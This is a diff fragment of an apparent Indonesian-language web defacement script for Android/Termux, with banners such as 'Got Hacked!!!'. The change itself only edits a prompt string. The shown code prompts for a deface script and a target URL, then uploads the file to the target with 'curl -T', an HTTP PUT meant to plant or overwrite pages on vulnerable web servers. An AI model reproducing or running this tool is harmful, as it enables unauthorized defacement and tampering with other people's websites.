@@ -83,7 +83,7 @@ echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Kalo Mau Tebas Index Namai SC 
 read -p " ╰─$ " script
 echo
 echo
-echo $white"  Masukan Target 1 !!!!"
+echo $white"  Masukan Target !!!!"
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Got Hacked!!!"$white
 read -p " ╰─$ " target
 curl -T /storage/emulated/0/$script $target
